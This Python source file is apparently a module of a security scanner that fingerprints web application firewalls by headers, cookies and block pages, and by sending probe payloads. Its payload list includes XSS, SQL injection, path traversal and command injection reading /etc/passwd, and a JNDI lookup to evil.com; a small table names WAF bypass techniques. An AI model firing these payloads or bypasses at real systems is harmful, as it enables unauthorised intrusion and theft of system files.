#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WAF/IPS Detection Module

Detects and analyzes Web Application Firewalls and Intrusion Prevention Systems:
- WAF fingerprinting
- Detection method analysis
- Bypass technique suggestions
- Rule set identification
"""

import asyncio
from typing import Dict, Any, List, Optional
from urllib.parse import urljoin
import logging

from modules.base import BaseModule
from core.state import DiscoveredAsset, Finding

logger = logging.getLogger(__name__)


class WAFDetectionModule(BaseModule):
    """
    WAF/IPS detection and analysis module
    """
    
    MODULE_NAME = "waf_detection"
    MODULE_DESCRIPTION = "WAF/IPS detection and fingerprinting"
    
    # WAF detection payloads
    WAF_PAYLOADS = [
        "<script>alert(1)</script>",
        "' OR '1'='1",
        "../../../etc/passwd",
        "; cat /etc/passwd",
        "<iframe src=javascript:alert(1)>",
        "UNION SELECT NULL--",
        "${jndi:ldap://evil.com}",
        "{{7*7}}",
        "' AND 1=1 --",
        "<body onload=alert(1)>"
    ]
    
    # Known WAF signatures
    WAF_SIGNATURES = {
        'Cloudflare': {
            'headers': ['CF-RAY', 'CF-Cache-Status', 'cf-ray', 'cf-cache-status'],
            'cookies': ['__cfduid', '__cf_bm'],
            'status_pages': ['cloudflare', 'cf-browser-verification']
        },
        'AWS WAF': {
            'headers': ['X-AMZ-CF-ID', 'x-amz-cf-id'],
            'cookies': ['aws-waf-token'],
            'status_pages': ['aws', 'amazon']
        },
        'ModSecurity': {
            'headers': ['ModSecurity', 'modsecurity'],
            'cookies': ['modsec'],
            'status_pages': ['mod security', 'modsecurity']
        },
        'Incapsula': {
            'headers': ['X-Iinfo', 'X-CDN', 'x-iinfo'],
            'cookies': ['visid_incap', 'incap_ses'],
            'status_pages': ['incapsula', 'imperva']
        },
        'Akamai': {
            'headers': ['X-Akamai', 'X-True-Cache-Key', 'x-akamai'],
            'cookies': ['AKA_A2', 'AKA_TL'],
            'status_pages': ['akamai', 'reference']
        },
        'Sucuri': {
            'headers': ['X-Sucuri', 'x-sucuri'],
            'cookies': ['sucuri'],
            'status_pages': ['sucuri', 'access denied']
        },
        'F5 BIG-IP ASM': {
            'headers': ['X-WA-Info', 'X-Cnection'],
            'cookies': ['BIGipServer', 'TS'],
            'status_pages': ['f5', 'big-ip']
        },
        'Barracuda': {
            'headers': ['X-Barracuda'],
            'cookies': ['barra'],
            'status_pages': ['barracuda']
        },
        'Fortinet': {
            'headers': ['X-FW-Info'],
            'cookies': ['FGTServer'],
            'status_pages': ['fortinet', 'fortigate']
        },
        'Wordfence': {
            'headers': ['X-WF-'],
            'cookies': ['wfvt_', 'wordfence'],
            'status_pages': ['wordfence']
        }
    }
    
    def __init__(self, config, state, http_client, ai_analyzer=None):
        super().__init__(config, state, http_client, ai_analyzer)
        self.target = config.get('target')
        self.detected_wafs: List[Dict] = []
        self.waf_bypass_techniques: List[str] = []
    
    async def run(self) -> Dict[str, Any]:
        """
        Execute WAF detection
        
        Returns:
            WAF detection results
        """
        self.logger.info(f"Starting WAF detection for {self.target}")
        
        # Passive detection
        passive_results = await self._passive_detection()
        
        # Active detection (skip in silent mode)
        mode = self.config.get('scan.mode')
        if mode != 'silent':
            active_results = await self._active_detection()
        else:
            active_results = {'assets': [], 'findings': []}
        
        # Analyze results
        all_assets = passive_results.get('assets', []) + active_results.get('assets', [])
        all_findings = passive_results.get('findings', []) + active_results.get('findings', [])
        
        # Add to state
        for asset_data in all_assets:
            asset = DiscoveredAsset(**asset_data)
            self.state.add_asset(asset)
        
        for finding_data in all_findings:
            finding = Finding(**finding_data)
            self.state.add_finding(finding)
        
        return self.get_results()
    
    async def _passive_detection(self) -> Dict[str, Any]:
        """Passive WAF detection from headers and cookies"""
        self.logger.info("Performing passive WAF detection")
        
        assets = []
        findings = []
        
        try:
            # Make normal request
            response = await self.http_client.get(self.target)
            headers = dict(response.headers)
            cookies = response.cookies
            
            # Check for WAF signatures in headers
            detected_wafs = []
            
            for waf_name, signatures in self.WAF_SIGNATURES.items():
                detection_score = 0
                evidence = []
                
                # Check headers
                for header in signatures['headers']:
                    for resp_header in headers:
                        if header.lower() in resp_header.lower():
                            detection_score += 1
                            evidence.append(f"Header: {resp_header}: {headers[resp_header]}")
                
                # Check cookies
                for cookie_name in signatures['cookies']:
                    for cookie in cookies.values():
                        if cookie_name.lower() in cookie.key.lower():
                            detection_score += 1
                            evidence.append(f"Cookie: {cookie.key}")
                
                # If detected
                if detection_score > 0:
                    detected_wafs.append({
                        'name': waf_name,
                        'confidence': min(detection_score / 2, 1.0),
                        'evidence': evidence
                    })
            
            # Add detected WAFs as assets
            for waf in detected_wafs:
                assets.append({
                    'type': 'waf',
                    'value': waf['name'],
                    'source': 'passive_detection',
                    'confidence': waf['confidence'],
                    'metadata': {
                        'detection_method': 'header_analysis',
                        'evidence': waf['evidence']
                    }
                })
                
                self.detected_wafs.append(waf)
            
            # Add findings
            if detected_wafs:
                waf_names = ', '.join([w['name'] for w in detected_wafs])
                findings.append({
                    'id': 'WAF001',
                    'title': f'Web Application Firewall Detected: {waf_names}',
                    'description': f'The following WAF(s) were detected: {waf_names}',
                    'severity': 'info',
                    'category': 'waf_detection',
                    'url': self.target,
                    'evidence': [f"Detected: {waf_names}"],
                    'remediation': 'WAF detection is informational. Ensure WAF is properly configured.'
                })
            
        except Exception as e:
            self.logger.error(f"Passive detection failed: {e}")
        
        return {'assets': assets, 'findings': findings}
    
    async def _active_detection(self) -> Dict[str, Any]:
        """Active WAF detection by sending attack payloads"""
        self.logger.info("Performing active WAF detection")
        
        assets = []
        findings = []
        
        try:
            # Send benign request for baseline
            baseline_response = await self.http_client.get(self.target)
            baseline_status = baseline_response.status
            baseline_content = await baseline_response.text()
            
            # Send attack payloads
            triggered_wafs = set()
            
            for payload in self.WAF_PAYLOADS[:5]:  # Limit payloads
                try:
                    test_url = f"{self.target}?test={payload}"
                    response = await self.http_client.get(test_url)
                    
                    content = await response.text()
                    
                    # Check for WAF blocking indicators
                    if response.status in [403, 406, 501, 999]:
                        # Check for WAF-specific response content
                        for waf_name, signatures in self.WAF_SIGNATURES.items():
                            for page_indicator in signatures['status_pages']:
                                if page_indicator.lower() in content.lower():
                                    triggered_wafs.add(waf_name)
                        
                        # Generic WAF detection
                        waf_keywords = [
                            'blocked', 'firewall', 'security', 'attack',
                            'suspicious', 'malicious', 'forbidden',
                            'access denied', 'unauthorized'
                        ]
                        
                        if any(kw in content.lower() for kw in waf_keywords):
                            # Generic WAF detected
                            pass
                    
                except Exception as e:
                    self.logger.debug(f"Payload test failed: {e}")
            
            # Add findings for triggered WAFs
            if triggered_wafs:
                for waf_name in triggered_wafs:
                    if waf_name not in [w['name'] for w in self.detected_wafs]:
                        assets.append({
                            'type': 'waf',
                            'value': waf_name,
                            'source': 'active_detection',
                            'confidence': 0.8,
                            'metadata': {
                                'detection_method': 'payload_response_analysis'
                            }
                        })
                
                # Generate bypass suggestions
                bypass_techniques = self._get_bypass_techniques(triggered_wafs)
                
                findings.append({
                    'id': 'WAF002',
                    'title': 'WAF Active Protection Confirmed',
                    'description': 'WAF is actively blocking attack payloads',
                    'severity': 'info',
                    'category': 'waf_detection',
                    'url': self.target,
                    'evidence': [f"Triggered WAFs: {', '.join(triggered_wafs)}"],
                    'remediation': 'WAF protection is active. Review bypass techniques for testing.'
                })
        
        except Exception as e:
            self.logger.error(f"Active detection failed: {e}")
        
        return {'assets': assets, 'findings': findings}
    
    def _get_bypass_techniques(self, waf_names: set) -> List[str]:
        """Get WAF bypass techniques for detected WAFs"""
        techniques = []
        
        bypass_db = {
            'Cloudflare': [
                'Use cloudfront domains as origin',
                'Lower case conversion',
                'Unicode normalization',
                'Request smuggling techniques'
            ],
            'ModSecurity': [
                'URL encoding variations',
                'Unicode encoding',
                'Comment injection',
                'Whitespace substitution'
            ],
            'Incapsula': [
                'IP rotation',
                'Request rate limiting',
                'Header manipulation',
                'Cookie handling'
            ],
            'AWS WAF': [
                'Size constraint bypass',
                'Encoding variations',
                'Header order manipulation'
            ],
            'default': [
                'URL encoding (single/double)',
                'Unicode normalization',
                'Case variation',
                'Comment injection',
                'Whitespace manipulation',
                'HTTP parameter pollution'
            ]
        }
        
        for waf in waf_names:
            if waf in bypass_db:
                techniques.extend(bypass_db[waf])
            else:
                techniques.extend(bypass_db['default'])
        
        return list(set(techniques))
